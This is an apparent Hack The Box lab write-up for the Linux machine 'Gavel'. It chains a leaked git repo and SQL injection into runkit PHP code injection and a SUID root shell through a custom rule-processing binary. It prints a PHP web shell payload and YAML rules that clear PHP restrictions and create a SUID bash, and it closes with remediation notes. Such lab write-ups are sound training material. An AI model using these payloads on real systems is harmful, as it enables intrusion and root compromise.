---
id: HTB-2026-GAVEL
title: Gavel
excerpt: Offensive security write-up.
date: '2025-11-29'
tags:
  - WRITEUP
  - HACKTHEBOX
  - LINUX
  - MEDIUM
  - SQLI
  - RUNKIT
  - SUID-EXECUTION
category: WRITEUP
platform: HACKTHEBOX
target_os: LINUX
difficulty: MEDIUM
severity: MEDIUM
icon: Terminal
author: '0x7CC'
---

# Hack The Box — Gavel (Linux) Write-Up: php git Leak → runkit RCE → SUID Privilege Escalation

## TL;DR
On **Gavel**, initial access starts with an exposed git repository that leaks administrative credentials via SQL Injection. Using the credentials, we log in to the administrative panel and exploit a PHP `runkit_function_add` injection to get remote code execution as `www-data`. Privilege escalation is achieved by abusing a vulnerable custom binary `gavel-util` which executes PHP rules, allowing us to bypass PHP restrictions and spawn a SUID root bash shell.

---

## Target
- Host: `gavel.htb`
- IP: `10.129.8.61`

---

## Recon: Git leakage and SQL injection

### Ports Scan
- **Port 22/tcp**: SSH
- **Port 80/tcp**: HTTP (PHP/Apache)

We locate an exposed `.git` repository. Extracting it reveals the source code of the web application. Analyzing the PHP files reveals a SQL Injection vulnerability in `inventory.php`.

By exploiting this SQL Injection, we dump the database and crack a bcrypt password hash:
- Username: `auctioneer`
- Password: `midnight1`

---

## Initial Foothold: RCE via runkit PHP injection

Using the recovered credentials, we access the admin portal at `admin.php`. The portal allows modifying auction rules, which are dynamically evaluated using PHP's `runkit_function_add` function. 

We submit a malicious rule containing a PHP backdoor payload:

```php
file_put_contents('../shell.php', '<?php system($_GET["c"]); ?>'); return true;
```

By placing a bid, the rule executes and writes the web shell to `shell.php`. We trigger a reverse shell to gain execution as `www-data`, then use the known credentials to switch to the user `auctioneer`.

---

## Privilege Escalation: Custom SUID gavel-util Exploitation

Local enumeration reveals a custom binary at `/usr/local/bin/gavel-util` which runs with high privileges. It processes submitted YAML configuration files and evaluates dynamic PHP rules.

To bypass PHP security restrictions (`disable_functions` and `open_basedir`), we first submit a YAML file that overwrites the local `php.ini` configuration:

```yaml
# fix_ini.yaml
name: fixini
rule: file_put_contents('/opt/gavel/.config/php/php.ini', "engine=On\ndisplay_errors=On\nopen_basedir=\ndisable_functions=\n"); return false;
```

Next, we submit a second YAML file containing code to copy bash and apply SUID permissions:

```yaml
# rootshell.yaml
name: rootshell
rule: system('cp /bin/bash /opt/gavel/rootbash; chmod u+s /opt/gavel/rootbash'); return false;
```

We run the tool:
```bash
/usr/local/bin/gavel-util submit rootshell.yaml
```

This triggers the rule as root, dropping a SUID bash shell. We run `/opt/gavel/rootbash -p` to access root.

---

## Defensive notes / remediation

### Fix
- Ensure that the `.git` directory is not exposed publicly on production servers.
- Do not use dangerous dynamic evaluation libraries like `runkit` with user-controlled input.
- Secure local binaries and avoid evaluating untrusted PHP rules in processes running with elevated privileges.

### Monitoring / detection ideas
- Audit filesystem activity on configuration directories like `/opt/gavel/.config/php/`.
- Detect execution of SUID binaries created in temporary folders.

---

## Lessons learned
- Exposed git repositories frequently leak database credentials and administrative endpoints.
- SUID binaries executing dynamic scripting engines are easy privilege escalation targets.

---

## Appendix: Timeline summary
1. Recon -> Extract git repo, find SQL injection, crack database password.
2. Exploitation -> Inject PHP code into runkit evaluator to obtain a shell as `www-data`.
3. User -> Switch to `auctioneer` using cracked credentials.
4. Privilege Escalation -> Abuse `gavel-util` rule processing to disable PHP restrictions and create a SUID root shell.

---
